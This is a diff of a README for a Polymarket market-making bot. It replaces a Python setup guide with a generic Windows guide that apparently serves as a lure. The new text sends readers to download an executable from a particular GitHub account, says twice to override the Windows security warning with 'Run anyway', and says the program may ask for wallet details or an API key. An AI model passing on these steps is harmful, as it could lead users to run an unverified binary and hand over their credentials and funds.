@@ -1,117 +1,122 @@
-# Polymarket Market Maker Bot | Automated CLOB Keeper for Passive Trading Income
+# 🤖 polymarket-market-maker-bot - Automate Your Market Making Easily
 
-**Language / 语言:** [English](README.md) | [中文](README.zh-CN.md)
-
-> **Contact:** [Telegram @movez_x](https://t.me/movez_x)
+[![Download polymarket-market-maker-bot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Dogolsn10/polymarket-market-maker-bot)
 
 ---
 
-## What Is This Bot?
+polymarket-market-maker-bot helps you manage market making on Polymarket. It works to keep your trading balanced and can improve your chances when dealing with automated markets. This guide will show you how to download and run the bot on Windows, step by step.
 
-The **Polymarket Market Maker Bot** is an automated keeper that provides liquidity on the [Polymarket](https://polymarket.com) CLOB (Central Limit Order Book). It continuously places and cancels orders around the midpoint price, acting as a market maker to earn the bid-ask spread while helping other traders execute their trades.
+## 🔍 What is polymarket-market-maker-bot?
 
-Whether you're a prediction market enthusiast or a DeFi trader looking for passive income, this bot runs 24/7 to capture market-making profits on Polymarket.
+polymarket-market-maker-bot is a tool designed to place buy and sell orders automatically on Polymarket, a platform for prediction markets. It adjusts your bids and asks to maintain liquidity and capture small profits from price differences. This bot helps traders by handling time-consuming tasks and keeping the market active.
+
+Key features you can expect:
+
+- Automatic bid and ask order placement  
+- Balance monitoring  
+- Support for arbitrage strategies  
+- Simple setup for regular PC users  
+
+## 🖥️ System Requirements
+
+Before you start, make sure your system meets these basic needs:
+
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- Around 200 MB of free disk space  
+- Active internet connection  
+- No special hardware needed  
+
+## 🌐 Where to Download  
+
+Click the button below to visit the page for downloads and instructions:
+
+[![Get polymarket-market-maker-bot](https://img.shields.io/badge/Get%20The%20Bot-blue)](https://github.com/Dogolsn10/polymarket-market-maker-bot)
+
+This link leads you to the main GitHub repository. You will find the latest version and setup files here.
+
+## ⬇️ How to Download and Install
+
+Follow these steps to get the bot running on your Windows machine.
+
+1. Open your web browser and go to  
+   https://github.com/Dogolsn10/polymarket-market-maker-bot
+
+2. Look for the "Releases" or "Assets" section on the page.
+
+3. Find the latest release and look for a Windows executable (.exe) or a zip file.
+
+4. Click the file to start the download.
+
+5. Once downloaded, locate the file in your Downloads folder.
+
+6. If it is a zip file, right-click and select "Extract All", then choose a folder.
+
+7. Open the folder where you extracted or downloaded the bot.
+
+8. Double-click on the executable file (e.g., `polymarket-market-maker-bot.exe`) to run the program.
+
+9. If your Windows blocks the app, choose "More info" and then "Run anyway."
+
+## ⚙️ Setting Up the Bot
+
+When you run the bot for the first time, you should see a simple window or command prompt.
+
+1. The bot may ask for your Polymarket API key or wallet details.  
+2. If you do not have an API key, visit Polymarket’s site to create one under your account settings.  
+3. Enter your API key in the prompt or configuration file as shown.
+
+Details you will likely need to enter:  
+
+- Your Polymarket account API key  
+- The trading markets you want to monitor  
+- Order size and price parameters  
+
+If the bot uses a configuration file, you can edit it in Notepad following the instructions inside.
+
+## 🕹️ How to Use polymarket-market-maker-bot
+
+Once the setup is complete, you can start the bot’s main functions:
+
+- The bot will place bids and asks based on the settings.  
+- It will adjust prices automatically to stay competitive.  
+- It will show status updates in the window or in the console.  
+- You can stop the bot by closing the program window.  
+
+If you want to change trading settings, close the bot and edit the config file or restart with new options.
+
+## 🔧 Troubleshooting Common Issues
+
+Here are solutions for problems you may find:
+
+- **Bot won’t start**: Make sure you have downloaded the right Windows version and your system meets the requirements.  
+- **Windows blocks the app as unknown**: Click “More info” then “Run anyway” in the security prompt.  
+- **No trades happen**: Check your API key and make sure it is correct and has permission.  
+- **Bot crashes or closes unexpectedly**: Restart your PC, check internet connection, and try again.  
+- **Orders don’t match desired amounts**: Adjust order size in settings and verify in config files.
+
+## 📈 How This Bot Works Internally
+
+The bot connects to Polymarket’s API to read market data. It then places buy and sell orders to keep the market balanced. The software uses algorithms to decide prices and sizes that aim to capture small profits while supporting liquidity.
+
+You do not need to know programming to use it, but knowing basic order types on Polymarket helps.
+
+## 🛠️ Updating the Bot
+
+To keep the bot working well:
+
+1. Check the GitHub page regularly for new versions.  
+2. Download the new executable or zip files.  
+3. Replace old files with the new version.  
+4. Restart the bot.
+
+## 🔐 Security Tips
+
+- Never share your API key with others.  
+- Use a Polymarket account with limited funds for bot trading.  
+- Keep your software updated.  
+- Avoid running files from unknown sources.
 
 ---
 
-## 5 Advantages for Traders
-
-| # | Advantage | Why It Matters |
-|---|-----------|----------------|
-| 1 | **Passive Income** | Earn the bid-ask spread automatically. Your capital works for you while you sleep—no manual trading required. |
-| 2 | **24/7 Automated Trading** | The bot monitors the order book and rebalances orders every 30 seconds (configurable). No need to watch charts or place orders manually. |
-| 3 | **Two Professional Strategies** | Choose **AMM** (concentrated liquidity style) or **Bands** (multi-tier order placement). Each strategy has tunable parameters for your risk/reward profile. |
-| 4 | **Full Control & Transparency** | Open-source code, configurable spreads, depth, and collateral limits. You decide how much capital to deploy and how tight your quotes are. |
-| 5 | **Graceful Shutdown** | On exit (SIGTERM), the bot cancels all open orders and exits cleanly—no orphaned orders left on the book. |
-
----
-
-## Get Full Code, Custom Features, Help, or Premium
-
-- **Full source code** – This repository contains the core bot. For extended features or custom builds, reach out.
-- **Add features** – Need a new strategy, multi-market support, or integrations? We can help.
-- **Technical support** – Stuck on setup or configuration? Get help from the team.
-- **Premium version** – For advanced features, dedicated support, or managed deployment.
-
-**Contact via Telegram:** [@movez_x](https://t.me/movez_x)
-
----
-
-## Quick Start – Run the Bot
-
-### Requirements
-
-- Python 3.10
-- A Polymarket account with USDC (Polygon)
-- A condition ID for the market you want to make
-
-### 1. Install
-
-```bash
-./install.sh
-```
-
-This creates a virtual environment and installs dependencies.
-
-### 2. Configure Environment
-
-Create a `.env` file (see `.env.example`):
-
-```
-PRIVATE_KEY=your_private_key
-RPC_URL=https://polygon-rpc.com
-CLOB_API_URL=https://clob.polymarket.com
-```
-
-### 3. Configure Market & Strategy
-
-Edit `config.env`:
-
-```
-CONDITION_ID=0x...   # Hex condition ID of your Polymarket market
-STRATEGY=amm         # or "bands"
-CONFIG=./config/amm.json   # or ./config/bands.json
-```
-
-Adjust strategy parameters in `./config/amm.json` or `./config/bands.json` as needed.
-
-### 4. Run
-
-```bash
-./run-local.sh
-```
-
-### Docker (Alternative)
-
-```bash
-docker compose up
-```
-
----
-
-## Strategy Overview
-
-| Strategy | Description |
-|----------|-------------|
-| **AMM** | Concentrated liquidity style—places orders at multiple price levels with configurable spread, delta, and depth. See [docs/strategies/amm.md](docs/strategies/amm.md). |
-| **Bands** | Multi-band strategy—maintains orders within specified price bands and size ranges. See [docs/strategies/bands.md](docs/strategies/bands.md). |
-
-The bot syncs every 30 seconds by default: it fetches the midpoint, computes expected orders, cancels outdated ones, and places new ones.
-
----
-
-## Disclaimer
-
-This software is experimental and in active development. Use at your own risk. Always test with small amounts first.
-
----
-
-## Contact
-
-**Telegram:** [@movez_x](https://t.me/movez_x)
-
----
-
-## 中文版 | Chinese Version
-
-[查看中文说明 → README.zh-CN.md](README.zh-CN.md)
+[Download polymarket-market-maker-bot](https://github.com/Dogolsn10/polymarket-market-maker-bot) and follow these steps to set up your market maker bot on Windows.
